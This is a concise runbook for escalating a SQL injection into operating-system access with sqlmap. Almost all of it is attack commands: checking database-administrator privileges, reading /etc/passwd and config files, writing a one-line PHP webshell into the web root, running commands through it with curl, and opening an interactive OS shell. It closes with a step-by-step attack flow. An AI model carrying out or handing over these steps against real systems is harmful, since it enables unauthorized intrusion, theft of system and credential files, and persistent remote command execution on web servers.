# SQLMap OS Exploitation – Quick Runbook

---

## Goal
Leverage SQLi to:
- Read local files
- Write files (webshell)
- Execute OS commands

---

## 1. Check DBA Privileges
Required for most OS-level actions.

```bash
sqlmap -u http://target.com/?id=1 --is-dba
````

✔ `True` → proceed
✘ `False` → OS exploitation unlikely

---

## 2. Read Local Files

Common targets:

* `/etc/passwd`
* Web config files

```bash
sqlmap -u http://target.com/?id=1 --file-read /etc/passwd
```

Output saved locally:

```bash
~/.sqlmap/output/<target>/files/
```

If issues:

```bash
--no-cast
--hex
```

---

## 3. Write Files (Webshell)

⚠️ Requires write permissions + DB config support

### Create shell

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### Upload shell

```bash
sqlmap -u http://target.com/?id=1 \
  --file-write shell.php \
  --file-dest /var/www/html/shell.php
```

### Test execution

```bash
curl http://target.com/shell.php?cmd=id
```

---

## 4. OS Shell (Automated)

Let SQLMap handle shell deployment.

```bash
sqlmap -u http://target.com/?id=1 --os-shell
```

If no output → force technique:

```bash
sqlmap -u http://target.com/?id=1 --os-shell --technique=E
```

---

## 5. Interactive Shell Usage

```text
os-shell> whoami
os-shell> ls -la
```

Exit:

```text
q
```

---

## 6. When Prompted

Defaults are safe:

* Web language → PHP
* Writable dir → common locations
* Use `--batch` to auto-accept

```bash
sqlmap ... --os-shell --batch
```

---

## Common Failure Causes

* No DBA privileges
* DB `secure-file-priv` enabled
* Web root not writable
* Blind-only SQLi (slow / limited)

---

## Recommended Flow

1️⃣ `--is-dba`
2️⃣ `--file-read /etc/passwd`
3️⃣ `--file-write` (if writable)
4️⃣ `--os-shell --technique=E`

---

